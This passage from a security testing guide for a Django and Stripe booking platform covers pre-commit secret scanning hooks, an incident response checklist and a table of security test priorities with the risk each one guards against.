  - repo: https://github.com/PyCQA/bandit
    rev: 1.7.8
    hooks:
      - id: bandit
        args: ["-ll", "-ii", "--skip=B101"]   # B101 = assert statements (OK in tests)
        files: ^backend/

  # Secret detection
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
        exclude: package-lock.json

  # Gitleaks — broader secret patterns
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.1
    hooks:
      - id: gitleaks

  # General hygiene
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: check-merge-conflict
      - id: check-yaml
      - id: end-of-file-fixer
      - id: no-commit-to-branch
        args: ['--branch', 'main']
```

**Install:**
```bash
pip install pre-commit
pre-commit install
pre-commit run --all-files   # run once on all files to create baseline
```

---

## 16. Incident Response Checklist

If a security incident is suspected:

### Immediate (0–1 hour)

- [ ] **Rotate** `DJANGO_SECRET_KEY` (invalidates all sessions and CSRF tokens).
- [ ] **Rotate** Stripe API keys in the Stripe Dashboard.
- [ ] **Rotate** database password and update `DATABASE_URL` environment variable.
- [ ] **Revoke** all JWT refresh tokens by flushing the token blacklist table.
- [ ] **Take down** affected features behind a feature flag or maintenance mode.

### Investigation (1–24 hours)

- [ ] Pull server access logs and filter for the affected user/IP range.
- [ ] Check Django admin audit trail for unauthorized actions.
- [ ] Review Stripe Dashboard for suspicious payment intents.
- [ ] Identify affected user accounts and scope of data accessed.

### Communication

- [ ] Notify affected users within 72 hours (GDPR/local law requirement).
- [ ] Prepare internal incident report documenting timeline, root cause, and fix.
- [ ] If payment data was involved, notify Stripe and begin PCI DSS breach procedures.

### Post-Incident

- [ ] Patch the vulnerability and deploy.
- [ ] Add a regression test covering the exploit path.
- [ ] Update this security testing guide with the new test case.
- [ ] Schedule a security review for the affected component.

---

## 17. Priority Reference

| Priority | Area | Test Section | Risk if Skipped |
|---|---|---|---|
| **CRITICAL** | SECRET_KEY from environment | §10.1 | Full session/CSRF compromise |
| **CRITICAL** | httpOnly cookie for JWT refresh | §2.2 | Token theft via XSS |
| **CRITICAL** | Stripe webhook signature mandatory | §6.4 | Fake payment events accepted |
| **CRITICAL** | No raw card data on server | §6.1 | PCI DSS violation, card exposure |
| **CRITICAL** | Booking status transitions enforced | §5.3 | Guests approve their own bookings |
| **CRITICAL** | Listing status transitions enforced | §5.4 | Hosts publish unreviewed listings |
| **HIGH** | IDOR — bookings, listings, reviews | §3.1–3.4 | Users access/modify each other's data |
| **HIGH** | Vertical privilege escalation | §3.1 | Guest accesses admin/host APIs |
| **HIGH** | File upload type validation | §7.1 | Remote code execution |
| **HIGH** | SQL injection | §4.1 | Database dump or destruction |
| **HIGH** | XSS — stored via listing content | §4.2 | Session hijack of any visitor |
| **HIGH** | Payment amount server-side | §6.2 | $1 bookings accepted |
| **HIGH** | Double-booking race condition | §5.1 | Overbooking, revenue loss |
| **HIGH** | Token expiry enforced | §2.3 | Indefinite use of compromised tokens |
| **HIGH** | CORS lockdown | §9.2 | Cross-origin data access |
| **MEDIUM** | DEBUG=False in production | §8.3 | Stack trace + DB schema exposed |
| **MEDIUM** | Brute force / rate limiting | §2.5 | Credential stuffing attacks succeed |
| **MEDIUM** | JWT algorithm confusion | §2.4 | Token forgery without secret |
| **MEDIUM** | Token invalidation on logout | §2.6 | Stolen token usable after logout |
| **MEDIUM** | Mass assignment protection | §4.4 | Users self-escalate to admin |
| **MEDIUM** | Error messages (no leakage) | §8.2 | Internal structure revealed |
| **MEDIUM** | OTP single-use enforcement | §2.7 | OTP replay attacks |
| **LOW** | Security headers (CSP, HSTS) | §9.1 | Clickjacking, protocol downgrade |
| **LOW** | Booking ID not in URL | §3.3 | Sequential enumeration of bookings |
| **LOW** | Dependency CVEs | §11.2 | Known exploits in third-party libs |
| **LOW** | Django admin hardening | §10.3 | Brute-forceable admin panel |
